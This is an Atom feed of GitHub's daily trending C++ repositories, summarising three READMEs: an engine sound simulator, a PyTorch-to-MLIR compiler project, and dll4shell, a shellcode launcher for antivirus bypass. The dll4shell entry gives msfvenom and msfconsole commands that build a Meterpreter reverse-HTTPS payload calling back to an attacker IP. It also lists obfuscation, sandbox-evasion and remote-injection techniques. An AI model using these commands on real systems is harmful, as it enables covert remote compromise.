<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C++ Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-08-12T01:30:53Z</updated>
  <subtitle>Daily Trending of C++ in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>ange-yaghi/engine-sim</title>
    <updated>2022-08-12T01:30:53Z</updated>
    <id>tag:github.com,2022-08-12:/ange-yaghi/engine-sim</id>
    <link href="https://github.com/ange-yaghi/engine-sim" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Combustion engine simulator that generates realistic audio.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Engine Simulator&lt;/h1&gt; &#xA;&lt;h2&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ange-yaghi/engine-sim/master/docs/public/screenshot_v01.png?raw=true&#34; alt=&#34;Alt text&#34;&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;&lt;strong&gt;Warning: code is in development and will change frequently&lt;/strong&gt;&lt;/h2&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;What is this?&lt;/h2&gt; &#xA;&lt;p&gt;This is a real-time internal combustion engine simulation &lt;strong&gt;designed specifically to produce engine audio and simulate engine response characteristics.&lt;/strong&gt; It is NOT a scientific tool and cannot be expected to provide accurate figures for the purposes of engineering or engine tuning.&lt;/p&gt; &#xA;&lt;h2&gt;Why is the code so sloppy?&lt;/h2&gt; &#xA;&lt;p&gt;I wrote this to demo in a &lt;a href=&#34;https://youtu.be/RKT-sKtR970&#34;&gt;YouTube video&lt;/a&gt;, not as a real product. If you would like it to become a usable product please reach out to me or join my Discord (link can be found in the description of the aforementioned YouTube video). I use this codebase for my own purposes and so it might change frequently and without warning.&lt;/p&gt; &#xA;&lt;h2&gt;How do I use it?&lt;/h2&gt; &#xA;&lt;p&gt;The UI is extremely minimalistic and there are only a few controls used to interact with the engine:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Key/Input&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Action&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;A&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Toggle ignition&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;S&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Hold for starter&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;D&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Enable dyno&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;F&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Enter fullscreen mode&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Shift&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Clutch (hold spacebar to slowly engage/disengage)&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Up Arrow&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Up Gear&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Down Arrow&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Down Gear&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Z + Scroll&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Volume&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;X + Scroll&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Convolution Level&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;C + Scroll&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;High freq gain&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;V + Scroll&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Low freq noise&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;B + Scroll&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;High freq noise&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;N + Scroll&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Simulation freq&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;M&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Increase View Layer&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;,&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Decrease View Layer&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Escape&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Exit the program&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Q, W, E, R&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Change throttle position&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;1, 2, 3, 4, 5&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Simulation time warp&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Tab&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;Change screen&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;How do I build it?&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note: this project currently only builds on Windows!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Step 1 - Clone the repository&lt;/h3&gt; &#xA;&lt;p&gt;&lt;code&gt;git clone --recurse-submodules https://github.com/ange-yaghi/engine-sim&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Step 2 - Install CMake&lt;/h3&gt; &#xA;&lt;p&gt;Install the latest version of CMake &lt;a href=&#34;https://cmake.org/&#34;&gt;here&lt;/a&gt; if it&#39;s not already installed.&lt;/p&gt; &#xA;&lt;h3&gt;Step 3 - Install Dependencies&lt;/h3&gt; &#xA;&lt;p&gt;You will need to install the following dependencies and CMake will need to be able to locate them (ie. they need to be listed on your PATH):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;1. SDL2&#xA;2. SDL2_image&#xA;3. Boost (make sure to build the optional dependencies)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Step 4 - Build and Run&lt;/h3&gt; &#xA;&lt;p&gt;From the root directory of the project, run the following commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;mkdir build&#xA;cd build&#xA;cmake ..&#xA;cmake --build .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If these steps are successful, a Visual Studio solution will be generated in &lt;code&gt;build&lt;/code&gt;. You can open this project with Visual Studio and then run the &lt;code&gt;engine-sim-app&lt;/code&gt; project. If you encounter an error telling you that you&#39;re missing DLLs, you will have to copy those DLLs to your EXE&#39;s directory.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>cepxeo/dll4shell</title>
    <updated>2022-08-12T01:30:53Z</updated>
    <id>tag:github.com,2022-08-12:/cepxeo/dll4shell</id>
    <link href="https://github.com/cepxeo/dll4shell" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Shellcode launcher for AV bypass&lt;/p&gt;&lt;hr&gt;&lt;h3&gt;C++ shellcode launcher&lt;/h3&gt; &#xA;&lt;p&gt;A collection of DLL wrappers around various shellcode injection and obfuscation techniques. Based on the &lt;a href=&#34;https://github.com/9emin1/charlotte&#34;&gt;charlotte&lt;/a&gt; tool.&lt;/p&gt; &#xA;&lt;h3&gt;Execution steps&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/cepxeo/dll4shell &amp;amp;&amp;amp; cd dll4shell&#xA;msfvenom -p windows/x64/meterpreter/reverse_https LHOST=YOUR_IP LPORT=443 EXITFUNC=thread -f raw -e x64/xor_dynamic -a x64 -o beacon.bin&#xA;&#xA;sudo apt install mingw-w64&#xA;&#xA;python dll4shell.py -e xor -o dll&#xA;&#xA;sudo msfconsole -q -x &#34;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST YOUR_IP; set LPORT 8443; exploit&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Techniques used (&lt;code&gt;-e&lt;/code&gt; parameter):&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Value&lt;/th&gt; &#xA;   &lt;th&gt;Obfuscation method, Details&lt;/th&gt; &#xA;   &lt;th&gt;Injection type&lt;/th&gt; &#xA;   &lt;th&gt;Code invocation&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;xor&lt;/td&gt; &#xA;   &lt;td&gt;XOR&lt;/td&gt; &#xA;   &lt;td&gt;Local&lt;/td&gt; &#xA;   &lt;td&gt;VirtualAlloc, CreateThread&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;xor1&lt;/td&gt; &#xA;   &lt;td&gt;XOR, sandbox evasion&lt;/td&gt; &#xA;   &lt;td&gt;Remote&lt;/td&gt; &#xA;   &lt;td&gt;VirtualAllocEx, CreateRemoteThread&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;xor2&lt;/td&gt; &#xA;   &lt;td&gt;XOR, sandbox evasion&lt;/td&gt; &#xA;   &lt;td&gt;Local&lt;/td&gt; &#xA;   &lt;td&gt;hHeapAlloc, hCreateThread&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;shift&lt;/td&gt; &#xA;   &lt;td&gt;Cezar&lt;/td&gt; &#xA;   &lt;td&gt;Local&lt;/td&gt; &#xA;   &lt;td&gt;VirtualAlloc, CreateThread&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;shift1&lt;/td&gt; &#xA;   &lt;td&gt;Cezar, sandbox evasion&lt;/td&gt; &#xA;   &lt;td&gt;Remote&lt;/td&gt; &#xA;   &lt;td&gt;VirtualAllocEx, CreateRemoteThread&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;Outputs (&lt;code&gt;-o&lt;/code&gt; parameter):&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Value&lt;/th&gt; &#xA;   &lt;th&gt;Details&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;dll&lt;/td&gt; &#xA;   &lt;td&gt;DLL callable via rundll32&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;xll&lt;/td&gt; &#xA;   &lt;td&gt;XLL callable via Add-Ins&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;payload&lt;/td&gt; &#xA;   &lt;td&gt;save encrypted payload only&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt;</summary>
  </entry>
  <entry>
    <title>llvm/torch-mlir</title>
    <updated>2022-08-12T01:30:53Z</updated>
    <id>tag:github.com,2022-08-12:/llvm/torch-mlir</id>
    <link href="https://github.com/llvm/torch-mlir" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The Torch-MLIR project aims to provide first class support from the PyTorch ecosystem to the MLIR ecosystem.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;The Torch-MLIR Project&lt;/h1&gt; &#xA;&lt;p&gt;The Torch-MLIR project aims to provide first class compiler support from the &lt;a href=&#34;https://pytorch.org&#34;&gt;PyTorch&lt;/a&gt; ecosystem to the MLIR ecosystem.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;This project is participating in the LLVM Incubator process: as such, it is not part of any official LLVM release. While incubation status is not necessarily a reflection of the completeness or stability of the code, it does indicate that the project is not yet endorsed as a component of LLVM.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://pytorch.org&#34;&gt;PyTorch&lt;/a&gt; An open source machine learning framework that accelerates the path from research prototyping to production deployment.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://mlir.llvm.org&#34;&gt;MLIR&lt;/a&gt; The MLIR project is a novel approach to building reusable and extensible compiler infrastructure. MLIR aims to address software fragmentation, improve compilation for heterogeneous hardware, significantly reduce the cost of building domain specific compilers, and aid in connecting existing compilers together.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/llvm/torch-mlir&#34;&gt;Torch-MLIR&lt;/a&gt; Multiple Vendors use MLIR as the middle layer, mapping from platform frameworks like PyTorch, JAX, and TensorFlow into MLIR and then progressively lowering down to their target hardware. We have seen half a dozen custom lowerings from PyTorch to MLIR. Having canonical lowerings from the PyTorch ecosystem to the MLIR ecosystem would provide much needed relief to hardware vendors to focus on their unique value rather than implementing yet another PyTorch frontend for MLIR. The goal is to be similar to current hardware vendors adding LLVM target support instead of each one also implementing Clang / a C++ frontend.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/llvm/torch-mlir/actions/workflows/buildRelease.yml&#34;&gt;&lt;img src=&#34;https://github.com/llvm/torch-mlir/actions/workflows/buildRelease.yml/badge.svg?sanitize=true&#34; alt=&#34;Release Build&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;All the roads from PyTorch to Torch MLIR Dialect&lt;/h2&gt; &#xA;&lt;p&gt;We have few paths to lower down to the Torch MLIR Dialect.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/llvm/torch-mlir/main/Torch-MLIR.png&#34; alt=&#34;Torch Lowering Architectures&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;TorchScript This is the most tested path down to Torch MLIR Dialect, and the PyTorch ecosystem is converging on using TorchScript IR as a lingua franca.&lt;/li&gt; &#xA; &lt;li&gt;LazyTensorCore Read more details &lt;a href=&#34;https://raw.githubusercontent.com/llvm/torch-mlir/main/docs/ltc_backend.md&#34;&gt;here&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Project Communication&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;#torch-mlir&lt;/code&gt; channel on the LLVM &lt;a href=&#34;https://discord.gg/xS7Z362&#34;&gt;Discord&lt;/a&gt; - this is the most active communication channel&lt;/li&gt; &#xA; &lt;li&gt;Github issues &lt;a href=&#34;https://github.com/llvm/torch-mlir/issues&#34;&gt;here&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://llvm.discourse.group/c/projects-that-want-to-become-official-llvm-projects/torch-mlir/41&#34;&gt;&lt;code&gt;torch-mlir&lt;/code&gt; section&lt;/a&gt; of LLVM Discourse&lt;/li&gt; &#xA; &lt;li&gt;Weekly meetings on Mondays 9AM PST. See &lt;a href=&#34;https://discourse.llvm.org/t/community-meeting-developer-hour-refactoring-recurring-meetings/62575&#34;&gt;here&lt;/a&gt; for more information.&lt;/li&gt; &#xA; &lt;li&gt;Weekly op office hours on Thursdays 8:30-9:30AM PST. See &lt;a href=&#34;https://discourse.llvm.org/t/announcing-torch-mlir-office-hours/63973/2&#34;&gt;here&lt;/a&gt; for more information.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Install torch-mlir snapshot&lt;/h2&gt; &#xA;&lt;p&gt;This installs a pre-built snapshot of torch-mlir for Python 3.7/3.8/3.9/3.10 on Linux and macOS.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;python -m venv mlir_venv&#xA;source mlir_venv/bin/activate&#xA;# Some older pip installs may not be able to handle the recent PyTorch deps&#xA;python -m pip install --upgrade pip&#xA;pip install --pre torch-mlir torchvision -f https://github.com/llvm/torch-mlir/releases --extra-index-url https://download.pytorch.org/whl/nightly/cpu&#xA;# This will install the corresponding torch and torchvision nightlies&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Demos&lt;/h2&gt; &#xA;&lt;h3&gt;TorchScript ResNet18&lt;/h3&gt; &#xA;&lt;p&gt;Standalone script to Convert a PyTorch ResNet18 model to MLIR and run it on the CPU Backend:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# Get the latest example if you haven&#39;t checked out the code&#xA;wget https://raw.githubusercontent.com/llvm/torch-mlir/main/examples/torchscript_resnet18.py&#xA;&#xA;# Run ResNet18 as a standalone script.&#xA;python examples/torchscript_resnet18.py&#xA;&#xA;load image from https://upload.wikimedia.org/wikipedia/commons/2/26/YellowLabradorLooking_new.jpg&#xA;Downloading: &#34;https://download.pytorch.org/models/resnet18-f37072fd.pth&#34; to /home/mlir/.cache/torch/hub/checkpoints/resnet18-f37072fd.pth&#xA;100.0%&#xA;PyTorch prediction&#xA;[(&#39;Labrador retriever&#39;, 70.66319274902344), (&#39;golden retriever&#39;, 4.956596374511719), (&#39;Chesapeake Bay retriever&#39;, 4.195662975311279)]&#xA;torch-mlir prediction&#xA;[(&#39;Labrador retriever&#39;, 70.66320037841797), (&#39;golden retriever&#39;, 4.956601619720459), (&#39;Chesapeake Bay retriever&#39;, 4.195651531219482)]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Lazy Tensor Core&lt;/h3&gt; &#xA;&lt;p&gt;View examples &lt;a href=&#34;https://raw.githubusercontent.com/llvm/torch-mlir/main/docs/ltc_examples.md&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Eager Mode&lt;/h3&gt; &#xA;&lt;p&gt;Eager mode with TorchMLIR is a very experimental eager mode backend for PyTorch through the torch-mlir framework. Effectively, this mode works by compiling operator by operator as the NN is eagerly executed by PyTorch. This mode includes a fallback to conventional PyTorch if anything in the torch-mlir compilation process fails (e.g., unsupported operator). A simple example can be found at &lt;a href=&#34;https://raw.githubusercontent.com/llvm/torch-mlir/main/examples/eager_mode.py&#34;&gt;eager_mode.py&lt;/a&gt;. A ResNet18 example can be found at &lt;a href=&#34;https://raw.githubusercontent.com/llvm/torch-mlir/main/examples/eager_mode_resnet18.py&#34;&gt;eager_mode_resnet18.py&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Repository Layout&lt;/h2&gt; &#xA;&lt;p&gt;The project follows the conventions of typical MLIR-based projects:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;include/torch-mlir&lt;/code&gt;, &lt;code&gt;lib&lt;/code&gt; structure for C++ MLIR compiler dialects/passes.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;test&lt;/code&gt; for holding test code.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;tools&lt;/code&gt; for &lt;code&gt;torch-mlir-opt&lt;/code&gt; and such.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;python&lt;/code&gt; top level directory for Python code&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Developers&lt;/h2&gt; &#xA;&lt;p&gt;If you would like to develop and build torch-mlir from source please look at &lt;a href=&#34;https://raw.githubusercontent.com/llvm/torch-mlir/main/development.md&#34;&gt;Development Notes&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>